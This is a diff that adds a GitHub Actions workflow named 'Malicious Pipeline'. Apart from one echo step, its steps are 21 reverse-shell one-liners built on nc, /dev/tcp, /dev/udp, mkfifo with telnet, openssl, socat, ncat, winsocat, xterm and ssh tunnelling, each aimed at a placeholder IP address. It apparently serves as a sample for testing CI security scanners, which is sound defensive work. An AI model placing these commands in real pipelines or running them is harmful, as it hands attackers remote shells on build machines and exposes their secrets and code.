@@ -1,0 +1,74 @@
+name: Malicious Pipeline
+on:
+  workflow_dispatch: # Manual triggering
+
+jobs:
+  malicious-job:
+    name: Malicious Job
+    runs-on: ubuntu-latest
+    steps:
+      - name: Hello
+        run: echo "Hello World!"
+
+      - name: reverse shell
+        run: nc -c bash 1.2.3.4 1
+
+      - name: reverse shell2
+        run: /bin/bash -i >& /dev/tcp/127.0.0.1/2 0>&1
+
+      - name: reverse shell3
+        run: /bin/sh -i >& /dev/tcp/127.0.0.1/3 0>&1
+
+      - name: reverse shell4
+        run: 0<&196;exec 196<>/dev/tcp/10.10.10.10/4; sh <&196 >&196 2>&196
+
+      - name: reverse shell5
+        run: /bin/sh -i >& /dev/tcp/127.0.0.1/5 0>&1
+
+      - name: reverse shell6
+        run: busybox nc 10.10.10.10 6 -e powershell
+
+      - name: reverse shell7
+        run: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2>&1|nc 10.10.10.10 7 >/tmp/f
+
+      - name: reverse shell8
+        run: /bin/sh -i 5<> /dev/tcp/10.10.10.10/8 0<&5 1>&5 2>&5
+
+      - name: reverse shell9
+        run: /bin/sh -i >& /dev/udp/10.10.10.10/9 0>&1
+
+      - name: reverse shell10
+        run: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 10 >/tmp/f
+
+      - name: reverse shell11
+        run: nc 10.10.10.10 11 -e /bin/sh
+
+      - name: reverse shell12
+        run: ncat.exe 10.10.10.10 9001 -e /bin/sh
+
+      - name: reverse shell13
+        run: TF=$(mktemp -u);mkfifo $TF && telnet 10.10.10.10 9001 0<$TF | /bin/sh 1>$TF
+
+      - name: reverse shell14
+        run: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:9001 > /tmp/s; rm /tmp/s
+
+      - name: reverse shell15
+        run: xterm -display 15.15.15.15:15
+
+      - name: reverse shell16
+        run: ncat 16.16.16.16 443 --ssl  -c  "bash -i 2>&1"
+
+      - name: reverse shell17
+        run: openssl s_client -quiet -connect 17.17.17.17:17|/bin/bash|openssl s_client -quiet -connect 17.17.17.17:1717
+
+      - name: reverse shell18
+        run: socat TCP:18.18.18.18:18 EXEC:/bin/sh
+
+      - name: reverse shell19
+        run: socat TCP:19.19.19.19:19 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane
+
+      - name: reverse shell20
+        run: winsocat EXEC:C:\\Windows\\system32\\cmd.exe TCP:127.0.0.1:8000
+
+      - name: reverse shell21
+        run: ssh -R localhost:7070:localhost:22 192.168.1.3
